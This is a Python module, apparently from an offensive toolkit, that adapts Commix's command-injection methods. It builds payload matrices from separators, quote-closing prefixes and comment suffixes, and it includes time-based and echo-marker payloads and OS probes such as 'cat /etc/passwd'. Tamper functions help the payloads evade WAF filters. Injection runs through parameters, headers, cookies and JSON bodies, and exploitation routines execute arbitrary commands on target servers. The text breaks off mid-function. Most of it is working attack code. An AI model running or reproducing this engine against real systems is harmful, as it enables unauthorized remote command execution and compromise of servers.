"""
 █████╗ ██╗  ██╗███████╗██╗  ██╗ ██╗███╗   ██╗███████╗
 ██╔══██╗██║ ██╔╝██╔════╝██║  ██║███║████╗  ██║██╔════╝
 ███████║█████╔╝ █████╗  ███████║╚██║██╔██╗ ██║█████╗
 ██╔══██║██╔═██╗ ██╔══╝  ██╔══██║ ██║██║╚██╗██║██╔══╝
 ██║  ██║██║  ██╗██║     ██║  ██║ ██║██║ ╚████║███████╗
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═╝╚═╝  ╚═══╝╚══════╝

 ZYLON FUSION v3.0 - Commix Fusion Command Injection Engine
 Fused from: Commix by Anastasios Stasinopoulos (github.com/commixproject/commix)
 Adapted for: ZYLON FUSION | Termux Non-Root | Sync Architecture

 Core Commix Algorithms Ported & Fused:
   1. Classic (Results-Based) Command Injection - echo/printf marker extraction
   2. Blind (Time-Based) Command Injection - sleep/ping/timeout timing analysis
   3. OS Detection (Linux/Windows) - uname vs ver, /etc/passwd vs %WINDIR%
   4. Separator + Prefix + Suffix Matrix - exhaustive injection context coverage
   5. Tamper/Bypass Techniques - IFS substitution, case variation, comment insertion,
      URL encoding, double encoding, base64 encoding
   6. Multi-Point Injection - GET params, POST data, HTTP headers
   7. Boolean Inference for Blind CMDi - inspired by BlindSQLiDetector pattern
   8. Interactive Pseudo-Shell - persistent command execution

 Scan Types Added to ZYLON:
   61 - Command Injection Detector
   62 - Command Injection + OS Detection
   63 - Command Injection Shell (Interactive)

 IMPORTANT: This is a standalone engine that fuses Commix's logic patterns.
 It does NOT import from commix directly.
"""

import re
import time
import random
import string
import base64
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    import requests

import requests  # needed for type annotations at runtime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.shared_infra import shared_session, PayloadInjector, regex_cache

from rich.console import Console
from rich.table import Table

console = Console()


# ============================================================================
# PAYLOAD CONSTANTS - Extracted from Commix's injection patterns
# ============================================================================

# Separators: characters used to chain commands
# From Commix: DEFAULT_SEPARATORS + SPECIAL_SEPARATORS
SEPARATORS = [
    ";",          # Sequential execution
    "&",          # Background/sequential (URL: %26)
    "|",          # Pipe output
    "&&",         # AND - execute if previous succeeded (URL: %26%26)
    "||",         # OR - execute if previous failed
    "%0a",        # Newline
    "%0d%0a",     # CRLF
    "%1a",        # Substitution character (Windows)
]

# Prefixes: characters to close open contexts before injection
# From Commix: PREFIXES_LVL1 + PREFIXES_LVL2 + PREFIXES_LVL3
PREFIXES = [
    "",           # No prefix needed
    "'",          # Close single quote
    '"',          # Close double quote
    ")",          # Close parenthesis
    "')",         # Close quoted parenthesis
    "\")",        # Close double-quoted parenthesis
    "';",         # Close single quote + semicolon
    '";',         # Close double quote + semicolon
    ");",         # Close parenthesis + semicolon
    "')}",        # Close quoted paren + brace
    "\")}",       # Close double-quoted paren + brace
    ")}",         # Close paren + brace
    ";",          # Just semicolon
    "&",          # Just ampersand
    "|",          # Just pipe
]

# Suffixes: characters to comment out or close after injection
# From Commix: SUFFIXES_LVL1 + SUFFIXES_LVL2 + SUFFIXES_LVL3
SUFFIXES = [
    "",           # No suffix
    "#",          # Bash comment
    "//",         # Double slash comment
    "\\\\",       # Double backslash
    "'",          # Close trailing single quote
    '"',          # Close trailing double quote
    " #",         # Space + hash comment
    " //",        # Space + double slash
    " &&",        # Space + AND
    " ||",        # Space + OR
    " %00",       # Null byte
    "' #",        # Close quote + comment
    '" #',        # Close double quote + comment
    "') #",       # Close quoted paren + comment
]

# Command substitution wrappers (from Commix CMD_SUB_PREFIX/SUFFIX)
CMD_SUB_PREFIX = "$("
CMD_SUB_SUFFIX = ")"

# Backtick command substitution
BACKTICK_PREFIX = "`"
BACKTICK_SUFFIX = "`"

# Windows-specific null redirect (from Commix CMD_NUL)
WIN_NUL = ">nul"
WIN_NUL_2 = "2>nul"

# Time-based delay payloads for Linux
LINUX_TIME_PAYLOADS = [
    "sleep {delay}",
    "ping -c {delay} 127.0.0.1",
    "timeout {delay}",
    "sleep {delay} && echo {marker}",
]

# Time-based delay payloads for Windows
WINDOWS_TIME_PAYLOADS = [
    "ping -n {delay} 127.0.0.1",
    "timeout /t {delay} /nobreak >nul",
    "powershell.exe -InputFormat none Start-Sleep -s {delay}",
    "ping -n {delay} -w 1000 127.0.0.1 >nul",
]

# OS Detection payloads
OS_DETECT_LINUX = [
    "uname",
    "cat /etc/passwd",
    "id",
    "whoami",
    "ls /etc",
    "/bin/uname",
]

OS_DETECT_WINDOWS = [
    "ver",
    "echo %WINDIR%",
    "echo %OS%",
    "whoami",
    "dir %WINDIR%",
    "cmd /c ver",
]

# Classic detection markers (echo-based)
CLASSIC_DETECT_LINUX = [
    "echo {marker}",
    "printf {marker}",
    "/bin/echo {marker}",
    "/usr/bin/printf {marker}",
]

CLASSIC_DETECT_WINDOWS = [
    "echo {marker}",
    "cmd /c echo {marker}",
    "powershell.exe -InputFormat none write-host {marker}",
]

# Tamper whitespace substitutions (from Commix space2ifs)
WHITESPACE_SUBS = [
    "${IFS}",     # Bash IFS variable
    "$IFS",       # IFS without braces
    "{IFS}",      # IFS with curly braces
    "%09",        # Tab character
    "%0b",        # Vertical tab
    "+",          # Plus sign (in URL context)
    "%20",        # URL-encoded space
]

# HTTP Header injection points (from Commix's header injection logic)
HEADER_INJECTION_POINTS = [
    "User-Agent",
    "Referer",
    "Cookie",
    "Host",
    "X-Forwarded-For",
    "Accept-Language",
    "Accept",
    "Origin",
]


# ============================================================================
# TAMPER ENGINE - Bypass techniques from Commix
# ============================================================================

class TamperEngine:
    """Command injection payload tamper/bypass engine.
    Adapted from Commix's tamper script architecture (src/core/tamper/).

    Provides methods to transform payloads to evade WAF/IPS filters.
    Each tamper technique corresponds to a Commix tamper script:
      - space2ifs -> ${IFS} whitespace substitution
      - randomcase -> Case variation (SLeeP, SlEeP)
      - comment_insert -> Comment insertion (s/**/leep)
      - url_encode -> URL encoding
      - double_encode -> Double URL encoding
      - base64_encode -> Base64 encoding
    """

    @staticmethod
    def space2ifs(payload: str) -> str:
        """Replace spaces with ${IFS} (Internal Field Separator).
        From Commix: src/core/tamper/space2ifs.py
        Works on Unix-like targets only."""
        return payload.replace(" ", "${IFS}")

    @staticmethod
    def space2ifs_alt(payload: str) -> str:
        """Replace spaces with $IFS (alternate form).
        Some shells accept this variant."""
        return payload.replace(" ", "$IFS")

    @staticmethod
    def space2tab(payload: str) -> str:
        """Replace spaces with tab characters.
        From Commix: src/core/tamper/space2htab.py"""
        return payload.replace(" ", "%09")

    @staticmethod
    def randomcase(payload: str, cmd_only: bool = True) -> str:
        """Randomize case of command keywords.
        From Commix: src/core/tamper/randomcase.py
        Example: 'sleep' -> 'SLeeP', 'SlEeP', etc."""
        if cmd_only:
            # Only randomize known command keywords
            keywords = [
                "sleep", "echo", "printf", "cat", "id", "whoami",
                "uname", "ping", "timeout", "cmd", "powershell",
                "type", "dir", "ver", "for", "if", "set", "find",
                "wget", "curl", "nc", "bash", "sh", "ls", "pwd",
            ]
            result = payload
            for kw in keywords:
                if kw in result.lower():
                    # Find the keyword case-insensitively and replace with random case
                    pattern = re.compile(re.escape(kw), re.IGNORECASE)
                    def randomize(m):
                        return "".join(
                            random.choice((str.upper, str.lower))(c)
                            for c in m.group(0)
                        )
                    result = pattern.sub(randomize, result)
            return result
        else:
            return "".join(
                random.choice((str.upper, str.lower))(c)
                for c in payload
            )

    @staticmethod
    def comment_insert(payload: str) -> str:
        """Insert inline comments between characters of keywords.
        From Commix's comment insertion technique.
        Example: 'sleep' -> 's/**/leep', 'sl/**/eep'"""
        keywords = ["sleep", "echo", "printf", "cat", "id", "whoami", "uname"]
        result = payload
        for kw in keywords:
            if kw in result.lower():
                pattern = re.compile(re.escape(kw), re.IGNORECASE)
                def insert_comment(m):
                    word = m.group(0)
                    mid = len(word) // 2
                    if mid == 0:
                        return word
                    return word[:mid] + "/**/" + word[mid:]
                result = pattern.sub(insert_comment, result)
        return result

    @staticmethod
    def url_encode(payload: str) -> str:
        """URL-encode the payload.
        From Commix's URL encoding technique."""
        from urllib.parse import quote
        return quote(payload, safe="")

    @staticmethod
    def double_encode(payload: str) -> str:
        """Double URL-encode the payload.
        From Commix's double encoding technique.
        Effective against filters that decode once."""
        from urllib.parse import quote
        first = quote(payload, safe="")
        return quote(first, safe="")

    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64-encode the payload.
        From Commix: src/core/tamper/base64encode.py
        Requires the target to decode (e.g., via eval/base64_decode)."""
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def backtick_substitution(payload: str) -> str:
        """Replace $(cmd) with `cmd` backtick syntax.
        From Commix's backticks tamper."""
        result = payload
        # Replace $(...) with `...`
        pattern = re.compile(r'\$\(([^)]+)\)')
        while pattern.search(result):
            result = pattern.sub(r'`\1`', result, count=1)
        return result

    @staticmethod
    def dollar_atsigns(payload: str) -> str:
        """Insert dollar-atsign ($) and atsign (@) noise into commands.
        From Commix: src/core/tamper/dollaratsigns.py
        Example: 'cat' -> 'c$@at'"""
        result = payload
        for i, c in enumerate(result):
            if c.isalpha() and i > 0 and result[i - 1].isalpha():
                if random.random() < 0.3:
                    result = result[:i] + "$@" + result[i:]
                    break  # Only insert once to avoid over-transformation
        return result

    @staticmethod
    def caret_escape(payload: str) -> str:
        """Use caret (^) escaping for Windows payloads.
        From Commix: src/core/tamper/caret.py
        Example: 'sleep' -> 'sl^eep' (Windows CMD)"""
        result = payload
        for i, c in enumerate(result):
            if c.isalpha() and i > 0 and result[i - 1].isalpha():
                if random.random() < 0.3:
                    result = result[:i] + "^" + result[i:]
                    break
        return result

    @staticmethod
    def _apply_single(payload: str, technique: str = "none") -> str:
        """Apply a specific tamper technique to a payload.

        Params:
            payload (str): The raw payload to tamper
            technique (str): Tamper technique name

        Returns:
            str: The tampered payload
        """
        tamper_map = {
            "none": lambda p: p,
            "space2ifs": TamperEngine.space2ifs,
            "space2ifs_alt": TamperEngine.space2ifs_alt,
            "space2tab": TamperEngine.space2tab,
            "randomcase": TamperEngine.randomcase,
            "comment_insert": TamperEngine.comment_insert,
            "url_encode": TamperEngine.url_encode,
            "double_encode": TamperEngine.double_encode,
            "base64_encode": TamperEngine.base64_encode,
            "backtick": TamperEngine.backtick_substitution,
            "dollar_atsigns": TamperEngine.dollar_atsigns,
            "caret": TamperEngine.caret_escape,
        }
        func = tamper_map.get(technique, lambda p: p)
        return func(payload)

    def apply_tamper(self, payload, techniques):
        """Apply multiple tamper techniques in sequence.

        Params:
            payload (str): Original payload
            techniques (list): List of tamper technique names

        Returns:
            str: Modified payload
        """
        result = payload
        for technique in techniques:
            result = TamperEngine._apply_single(result, technique)
        return result


# ============================================================================
# COMMAND INJECTION ENGINE - Core Engine
# ============================================================================

class CommandInjectionEngine:
    """Commix Fusion Command Injection Engine for ZYLON FUSION.

    Fuses the core command injection techniques from the Commix project
    (github.com/commixproject/commix) into the ZYLON FUSION toolkit.

    This engine extracts and adapts Commix's injection patterns:
      - Classic (results-based) injection with echo/printf marker extraction
      - Blind (time-based) injection with timing analysis
      - OS detection via platform-specific commands
      - Multi-point injection (GET, POST, Headers)
      - Tamper/bypass techniques from Commix's tamper scripts

    The engine follows ZYLON's architecture patterns:
      - requests.Session for HTTP communication
      - rich console for formatted output
      - console.status() for progress indication
      - Table for results display

    Scan Types:
        61 - Command Injection Detector
        62 - Command Injection + OS Detection
        63 - Command Injection Shell (Interactive)
    """

    # Timing threshold for blind detection (seconds above baseline)
    BLIND_THRESHOLD = 1.5

    # Number of baseline requests for timing calibration
    BASELINE_SAMPLES = 5

    # Maximum response time to consider valid (reject outliers)
    MAX_RESPONSE_TIME = 30.0

    # Classic detection marker length
    MARKER_LENGTH = 8

    def __init__(self, session=None):
        """Initialize the Command Injection Engine.

        Params:
            session: ZYLON's HTTP session with configured headers, cookies,
                and SSL verification settings. Defaults to shared_session.
        """
        self.session = session or shared_session
        self.tamper = TamperEngine()
        self._baseline_time = None
        self._detected_os = None
        self._working_payloads = []
        self._vuln_info = {}

    # ========================================================================
    # INTERNAL UTILITIES
    # ========================================================================

    @staticmethod
    def _generate_marker(length: int = 8) -> str:
        """Generate a random alphanumeric marker for result extraction.
        This marker is injected via echo/printf and searched for in responses.
        Inspired by Commix's TAG generation."""
        chars = string.ascii_lowercase + string.digits
        return "".join(random.choice(chars) for _ in range(length))

    @staticmethod
    def _generate_rand_nums():
        """Generate two random numbers and their sum for calculation-based
        detection. From Commix's decision payload (randv1 + randv2 = randvcalc)."""
        randv1 = random.randint(100, 999)
        randv2 = random.randint(100, 999)
        return randv1, randv2, randv1 + randv2

    def _build_injection_matrix(self) -> list:
        """Build the full separator + prefix + suffix injection matrix.
        Returns list of (separator, prefix, suffix) tuples covering at least
        20 combinations, as extracted from Commix's injection patterns.

        The matrix prioritizes the most commonly successful combinations:
          - No prefix/suffix with each separator (direct injection)
          - Quote-closing prefixes with semicolon separators
          - Comment-out suffixes for clean termination
        """
        matrix = []
        # Priority 1: Direct injection with each separator (no prefix/suffix)
        for sep in SEPARATORS:
            matrix.append((sep, "", ""))

        # Priority 2: Quote-closing prefixes with key separators
        for prefix in ["'", '"', ")", "')", "\")"]:
            for sep in [";", "&", "|", "%0a"]:
                matrix.append((sep, prefix, ""))

        # Priority 3: Comment suffixes for clean termination
        for sep in [";", "&", "|", "%0a"]:
            for suffix in ["#", "//", "' #", '" #', " %00"]:
                matrix.append((sep, "", suffix))

        # Priority 4: Combined prefix + suffix for complex contexts
        for sep in [";", "%0a"]:
            for prefix in ["'", '"', "')"]:
                for suffix in ["#", "//"]:
                    matrix.append((sep, prefix, suffix))

        return matrix

    def _build_classic_payload(self, marker: str, separator: str,
                                prefix: str = "", suffix: str = "",
                                os_type: str = "linux") -> str:
        """Build a classic (results-based) detection payload.
        Adapted from Commix's cb_payloads.decision().

        For Linux: Uses echo with command substitution markers
        For Windows: Uses echo with for /f loop wrapper

        Params:
            marker (str): Random marker to search for in response
            separator (str): Command separator (;  |  &  etc.)
            prefix (str): Injection prefix to close open contexts
            suffix (str): Injection suffix for comment/cleanup
            os_type (str): 'linux' or 'windows'

        Returns:
            str: Complete injection payload
        """
        if os_type == "windows":
            # Commix Windows classic: for /f "tokens=*" %i in ('cmd /c "echo MARKER"')
            # do @set /p = MARKERMARKER%iMARKERMARKER >nul
            payload = (
                f"{prefix}{separator}"
                f"cmd /c echo {marker}"
                f"{suffix}"
            )
        else:
            # Commix Linux classic: ; echo TAG$(echo TAG)TAG
            # Uses command substitution $(...) to embed markers
            payload = (
                f"{prefix}{separator}"
                f"echo {marker}"
                f"{CMD_SUB_PREFIX}echo {marker}{CMD_SUB_SUFFIX}"
                f"{marker}"
                f"{suffix}"
            )
        return payload

    def _build_blind_payload(self, delay: int, separator: str,
                              prefix: str = "", suffix: str = "",
                              os_type: str = "linux") -> str:
        """Build a time-based blind detection payload.
        Adapted from Commix's tb_payloads.decision().

        For Linux: Uses sleep, ping -c, or timeout
        For Windows: Uses ping -n, timeout /t, or powershell Start-Sleep

        Params:
            delay (int): Delay in seconds for timing-based detection
            separator (str): Command separator
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_type (str): 'linux' or 'windows'

        Returns:
            str: Complete time-based injection payload
        """
        if os_type == "windows":
            # Windows: ping -n delay 127.0.0.1 (each ping = ~1 second)
            payload = f"{prefix}{separator}ping -n {delay + 1} 127.0.0.1{suffix}"
        else:
            # Linux: sleep delay
            payload = f"{prefix}{separator}sleep {delay}{suffix}"
        return payload

    def _build_os_detect_payload(self, separator: str, prefix: str = "",
                                  suffix: str = "", os_guess: str = "linux") -> str:
        """Build an OS detection payload.
        Uses platform-specific commands that only succeed on the target OS.

        Params:
            separator (str): Command separator
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_guess (str): OS guess to test ('linux' or 'windows')

        Returns:
            str: OS detection injection payload
        """
        if os_guess == "linux":
            payload = f"{prefix}{separator}uname{suffix}"
        else:
            payload = f"{prefix}{separator}ver{suffix}"
        return payload

    def _build_classic_exec_payload(self, command: str, marker: str,
                                     separator: str, prefix: str = "",
                                     suffix: str = "",
                                     os_type: str = "linux") -> str:
        """Build a classic exploitation payload for command execution.
        Adapted from Commix's cb_payloads.cmd_execution().

        Wraps the command output between double markers for extraction:
          Linux:   ; echo TAG$(echo TAG)$(COMMAND)$(echo TAG)TAG
          Windows: ; for /f "tokens=*" %i in ('cmd /c "COMMAND"')
                   do @set /p = TAGTAG%iTAGTAG >nul

        Params:
            command (str): OS command to execute
            marker (str): Extraction marker
            separator (str): Command separator
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_type (str): 'linux' or 'windows'

        Returns:
            str: Complete exploitation payload
        """
        if os_type == "windows":
            payload = (
                f"{prefix}{separator}"
                f"for /f \"tokens=*\" %i in ('cmd /c \"{command}\"') "
                f"do @set /p = {marker}{marker}%i{marker}{marker} >nul"
                f"{suffix}"
            )
        else:
            cmd_exec = f"{CMD_SUB_PREFIX}{command}{CMD_SUB_SUFFIX}"
            payload = (
                f"{prefix}{separator}"
                f"echo {marker}"
                f"{CMD_SUB_PREFIX}echo {marker}{CMD_SUB_SUFFIX}"
                f"{cmd_exec}"
                f"{CMD_SUB_PREFIX}echo {marker}{CMD_SUB_SUFFIX}"
                f"{marker}"
                f"{suffix}"
            )
        return payload

    def _build_blind_exec_payload(self, command: str, delay: int,
                                   separator: str, prefix: str = "",
                                   suffix: str = "",
                                   os_type: str = "linux") -> str:
        """Build a blind exploitation payload for command execution.
        Adapted from Commix's tb_payloads.cmd_execution().

        Uses timing to infer command output character by character.
        The technique works by checking if a character at a position
        matches, and sleeping only if it does.

        For a simpler approach (used here), we execute the command
        and add a sleep to confirm execution:
          ; COMMAND && sleep N

        Params:
            command (str): OS command to execute
            delay (int): Confirmation delay in seconds
            separator (str): Command separator
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_type (str): 'linux' or 'windows'

        Returns:
            str: Complete blind exploitation payload
        """
        if os_type == "windows":
            payload = (
                f"{prefix}{separator}"
                f"cmd /c \"{command}\" && ping -n {delay + 1} 127.0.0.1"
                f"{suffix}"
            )
        else:
            payload = (
                f"{prefix}{separator}"
                f"{command} && sleep {delay}"
                f"{suffix}"
            )
        return payload

    def _send_injection(self, url: str, param: str, payload: str,
                         method: str = "GET", data: dict = None,
                         headers: dict = None,
                         injection_point: str = "param") -> object:
        """Send an injection payload to the target.

        Supports multiple injection points:
          - param: Inject into a GET/POST parameter
          - header: Inject into an HTTP header
          - cookie: Inject into a cookie value
          - json_body: Inject into a JSON request body

        Params:
            url (str): Target URL
            param (str): Parameter name to inject
            payload (str): Injection payload
            method (str): HTTP method ('GET' or 'POST')
            data (dict): POST data dictionary
            headers (dict): Custom headers dictionary
            injection_point (str): 'param', 'header', 'cookie', or 'json_body'

        Returns:
            requests.Response or None: HTTP response
        """
        try:
            if injection_point == "json_body":
                json_data = {param: payload}
                json_headers = {**(headers or {}), 'Content-Type': 'application/json'}
                resp = self.session.post(
                    url, json=json_data, headers=json_headers,
                    verify=False, timeout=15, allow_redirects=False
                )
            elif injection_point == "header":
                req_headers = dict(headers or {})
                req_headers[param] = payload
                if method.upper() == "POST":
                    resp = self.session.post(
                        url, data=data or {}, headers=req_headers,
                        verify=False, timeout=15, allow_redirects=False
                    )
                else:
                    resp = self.session.get(
                        url, headers=req_headers,
                        verify=False, timeout=15, allow_redirects=False
                    )
            elif injection_point == "cookie":
                req_cookies = {param: payload}
                if method.upper() == "POST":
                    resp = self.session.post(
                        url, data=data or {}, cookies=req_cookies,
                        verify=False, timeout=15, allow_redirects=False
                    )
                else:
                    resp = self.session.get(
                        url, cookies=req_cookies,
                        verify=False, timeout=15, allow_redirects=False
                    )
            else:
                # Parameter injection
                if method.upper() == "POST":
                    post_data = dict(data or {})
                    post_data[param] = payload
                    resp = self.session.post(
                        url, data=post_data,
                        verify=False, timeout=15, allow_redirects=False
                    )
                else:
                    sep = "&" if "?" in url else "?"
                    inject_url = f"{url}{sep}{param}={payload}"
                    resp = self.session.get(
                        inject_url,
                        verify=False, timeout=15, allow_redirects=False
                    )
            return resp
        except Exception:
            return None

    def _measure_baseline(self, url: str, param: str,
                           method: str = "GET", data: dict = None,
                           injection_point: str = "param") -> float:
        """Measure baseline response time by sending benign requests.
        From Commix's timing calibration logic.
        Takes multiple samples and returns the median.

        Params:
            url (str): Target URL
            param (str): Parameter name
            method (str): HTTP method
            data (dict): POST data
            injection_point (str): Injection point type

        Returns:
            float: Baseline response time in seconds
        """
        times = []
        benign_value = "test_benign_12345"
        for _ in range(self.BASELINE_SAMPLES):
            start = time.time()
            self._send_injection(
                url, param, benign_value,
                method=method, data=data,
                injection_point=injection_point
            )
            elapsed = time.time() - start
            if elapsed < self.MAX_RESPONSE_TIME:
                times.append(elapsed)
            time.sleep(0.2)  # Small delay between baseline requests

        if not times:
            return 2.0  # Default baseline if all failed

        times.sort()
        # Return median
        mid = len(times) // 2
        return times[mid]

    def _extract_marker_output(self, response: requests.Response,
                                marker: str) -> str:
        """Extract command output between markers from a response.
        Adapted from Commix's injection_results() regex extraction.

        Looks for patterns like: MARKERMARKER<output>MARKERMARKER
        or MARKER<output>MARKER (various marker combinations).

        Params:
            response (requests.Response): HTTP response
            marker (str): The marker to search for

        Returns:
            str: Extracted output or empty string
        """
        if not response or not response.text:
            return ""

        text = response.text
        # URL-decode and HTML-unescape for clean matching
        try:
            from urllib.parse import unquote
            text = unquote(text)
        except Exception:
            pass

        # Try to extract content between double markers (Commix pattern)
        # Pattern: MARKERMARKER(.*?)MARKERMARKER
        double_pattern = re.escape(marker + marker) + r"(.*?)" + re.escape(marker + marker)
        match = regex_cache.search(double_pattern, text, re.DOTALL)
        if match:
            return match.group(1).strip()

        # Try single marker pattern: MARKER(.*?)MARKER
        single_pattern = re.escape(marker) + r"(.*?)" + re.escape(marker)
        match = regex_cache.search(single_pattern, text, re.DOTALL)
        if match:
            return match.group(1).strip()

        # Try to find just the marker presence (weaker evidence)
        if marker in text:
            # Look for marker with some surrounding content
            idx = text.index(marker)
            start = max(0, idx - 50)
            end = min(len(text), idx + len(marker) + 200)
            return text[start:end]

        return ""

    # ========================================================================
    # DETECTION METHODS
    # ========================================================================

    def detect(self, url: str, param: str = None,
               method: str = "GET", data: dict = None,
               injection_points: list = None) -> dict:
        """Detect command injection vulnerabilities using boolean-based and
        time-based techniques.
        Adapted from Commix's detection phase (controller/controller.py).

        Tests each parameter with classic (results-based) payloads first,
        then falls back to blind (time-based) payloads. Checks multiple
        separator/prefix/suffix combinations from the injection matrix.

        Params:
            url (str): Target URL
            param (str): Specific parameter to test (None = auto-detect GET params)
            method (str): HTTP method ('GET' or 'POST')
            data (dict): POST data for POST requests
            injection_points (list): Custom injection points to test

        Returns:
            dict: Detection results with keys:
                - vulnerable (bool): Whether injection was confirmed
                - technique (str): 'classic' or 'blind'
                - injection_point (dict): Details of successful injection
                - payload (str): Successful payload
                - separator (str): Successful separator
                - prefix (str): Successful prefix
                - suffix (str): Successful suffix
                - os_type (str): Detected OS ('linux' or 'windows')
                - marker (str): Detection marker used
        """
        results = {
            "vulnerable": False,
            "technique": None,
            "injection_point": None,
            "payload": None,
            "separator": None,
            "prefix": None,
            "suffix": None,
            "os_type": None,
            "marker": None,
        }

        # Determine parameters to test
        params_to_test = []
        if param:
            params_to_test.append({
                "param": param,
                "injection_point": "param",
                "method": method,
                "data": data,
            })
        else:
            # Auto-detect GET parameters from URL
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(url)
            get_params = parse_qs(parsed.query)
            for p in get_params:
                params_to_test.append({
                    "param": p,
                    "injection_point": "param",
                    "method": "GET",
                    "data": None,
                })
            # Test POST data parameters
            if data:
                for p in data:
                    params_to_test.append({
                        "param": p,
                        "injection_point": "param",
                        "method": "POST",
                        "data": data,
                    })

        # Add header injection points
        if injection_points:
            for ip in injection_points:
                if ip.get("type") == "header":
                    params_to_test.append({
                        "param": ip.get("name", "User-Agent"),
                        "injection_point": "header",
                        "method": method,
                        "data": data,
                    })
                elif ip.get("type") == "cookie":
                    params_to_test.append({
                        "param": ip.get("name", "session"),
                        "injection_point": "cookie",
                        "method": method,
                        "data": data,
                    })
        else:
            # Default: test common header injection points and JSON body
            for header_name in HEADER_INJECTION_POINTS[:3]:  # User-Agent, Referer, Cookie
                params_to_test.append({
                    "param": header_name,
                    "injection_point": "header",
                    "method": method,
                    "data": data,
                })
            # Also test JSON body injection context
            if data:
                for p in data:
                    params_to_test.append({
                        "param": p,
                        "injection_point": "json_body",
                        "method": "POST",
                        "data": data,
                    })

        if not params_to_test:
            console.print("[yellow][!] No parameters found to test[/yellow]")
            return results

        # Build injection matrix
        matrix = self._build_injection_matrix()
        marker = self._generate_marker(self.MARKER_LENGTH)
        results["marker"] = marker

        console.print(f"\n[bold cyan][*] Command Injection Detection[/bold cyan]")
        console.print(f"[*] Target: {url}")
        console.print(f"[*] Testing {len(params_to_test)} injection point(s) with "
                       f"{len(matrix)} separator/prefix/suffix combinations")

        # ---- Phase 1: Classic (Results-Based) Detection ----
        with console.status("[bold cyan]Phase 1: Classic (results-based) detection...[/bold cyan]"):
            for ptest in params_to_test:
                for os_type in ["linux", "windows"]:
                    for sep, prefix, suffix in matrix:
                        payload = self._build_classic_payload(
                            marker, sep, prefix, suffix, os_type
                        )
                        resp = self._send_injection(
                            url, ptest["param"], payload,
                            method=ptest.get("method", "GET"),
                            data=ptest.get("data"),
                            injection_point=ptest["injection_point"],
                        )
                        if resp and resp.status_code == 200:
                            extracted = self._extract_marker_output(resp, marker)
                            if extracted:
                                results["vulnerable"] = True
                                results["technique"] = "classic"
                                results["injection_point"] = ptest
                                results["payload"] = payload
                                results["separator"] = sep
                                results["prefix"] = prefix
                                results["suffix"] = suffix
                                results["os_type"] = os_type
                                self._vuln_info = results
                                self._detected_os = os_type

                                console.print(
                                    f"[bold green][+] CLASSIC injection found![/bold green]"
                                )
                                console.print(
                                    f"    Parameter: {ptest['param']} "
                                    f"({ptest['injection_point']})"
                                )
                                console.print(f"    Separator: {sep}")
                                console.print(f"    OS: {os_type}")
                                console.print(f"    Payload: {payload[:80]}...")
                                return results

        # ---- Phase 2: Blind (Time-Based) Detection ----
        console.print("[yellow][*] Classic detection negative. Trying blind (time-based)...[/yellow]")

        # Measure baseline response time
        baseline = self._measure_baseline(
            url, params_to_test[0]["param"],
            method=params_to_test[0].get("method", "GET"),
            data=params_to_test[0].get("data"),
            injection_point=params_to_test[0]["injection_point"],
        )
        self._baseline_time = baseline
        console.print(f"[*] Baseline response time: {baseline:.2f}s")

        delay = max(3, int(baseline) + 3)  # Ensure delay > baseline

        with console.status("[bold cyan]Phase 2: Blind (time-based) detection...[/bold cyan]"):
            for ptest in params_to_test:
                for os_type in ["linux", "windows"]:
                    for sep, prefix, suffix in matrix[:15]:  # Test top combinations
                        payload = self._build_blind_payload(
                            delay, sep, prefix, suffix, os_type
                        )

                        # Measure injection response time
                        start_time = time.time()
                        resp = self._send_injection(
                            url, ptest["param"], payload,
                            method=ptest.get("method", "GET"),
                            data=ptest.get("data"),
                            injection_point=ptest["injection_point"],
                        )
                        elapsed = time.time() - start_time

                        # Check if response time indicates successful sleep
                        if elapsed >= (baseline + delay - 1):
                            # Confirm with a second test (false positive check)
                            confirm_delay = delay + random.randint(1, 3)
                            confirm_payload = self._build_blind_payload(
                                confirm_delay, sep, prefix, suffix, os_type
                            )
                            start_time = time.time()
                            self._send_injection(
                                url, ptest["param"], confirm_payload,
                                method=ptest.get("method", "GET"),
                                data=ptest.get("data"),
                                injection_point=ptest["injection_point"],
                            )
                            confirm_elapsed = time.time() - start_time

                            if confirm_elapsed >= (baseline + confirm_delay - 1.5):
                                results["vulnerable"] = True
                                results["technique"] = "blind"
                                results["injection_point"] = ptest
                                results["payload"] = payload
                                results["separator"] = sep
                                results["prefix"] = prefix
                                results["suffix"] = suffix
                                results["os_type"] = os_type
                                self._vuln_info = results
                                self._detected_os = os_type

                                console.print(
                                    "[bold green][+] BLIND (time-based) injection found![/bold green]"
                                )
                                console.print(
                                    f"    Parameter: {ptest['param']} "
                                    f"({ptest['injection_point']})"
                                )
                                console.print(f"    Separator: {sep}")
                                console.print(f"    OS: {os_type}")
                                console.print(
                                    f"    Baseline: {baseline:.2f}s | "
                                    f"Delay: {delay}s | "
                                    f"Actual: {elapsed:.2f}s"
                                )
                                return results

        console.print("[bold yellow][-] No command injection vulnerability detected[/bold yellow]")
        return results

    # ========================================================================
    # EXPLOITATION METHODS
    # ========================================================================

    def exploit_classic(self, url: str, param: str, command: str,
                         separator: str = ";", prefix: str = "",
                         suffix: str = "", os_type: str = "linux",
                         method: str = "GET", data: dict = None,
                         injection_point: str = "param") -> dict:
        """Execute a command via classic (results-based) injection.
        Adapted from Commix's results_based_injection() controller.

        Injects the command between markers and extracts the output
        from the HTTP response body.

        Params:
            url (str): Target URL
            param (str): Vulnerable parameter name
            command (str): OS command to execute
            separator (str): Command separator (from detection)
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_type (str): 'linux' or 'windows'
            method (str): HTTP method
            data (dict): POST data
            injection_point (str): Injection point type

        Returns:
            dict: Exploitation results with keys:
                - success (bool): Whether command executed
                - output (str): Command output
                - payload (str): Payload used
                - command (str): Command executed
        """
        result = {
            "success": False,
            "output": "",
            "payload": "",
            "command": command,
        }

        marker = self._generate_marker(self.MARKER_LENGTH)
        payload = self._build_classic_exec_payload(
            command, marker, separator, prefix, suffix, os_type
        )
        result["payload"] = payload

        # Try with tamper techniques if basic payload fails
        tamper_techniques = ["none", "space2ifs", "randomcase", "comment_insert"]

